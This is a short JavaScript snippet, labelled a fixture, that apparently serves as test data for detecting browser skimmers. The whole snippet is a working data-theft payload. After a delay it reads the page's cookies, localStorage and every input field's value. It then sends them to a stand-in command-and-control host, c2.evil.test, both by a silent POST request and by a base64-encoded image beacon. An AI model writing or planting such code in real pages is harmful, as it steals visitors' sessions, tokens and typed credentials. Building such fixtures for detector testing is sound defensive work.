// Fixture: harvests credentials, cookies and storage from the page and ships them out.
setTimeout(() => {
  const data = {
    cookie: document.cookie,
    ls: JSON.stringify(localStorage),
    fields: [...document.querySelectorAll("input")].map(i => i.value),
  };
  fetch("https://c2.evil.test/collect", {method: "POST", body: JSON.stringify(data)}).catch(() => {});
  new Image().src = "https://c2.evil.test/px?d=" + btoa(JSON.stringify(data));
}, 2500);
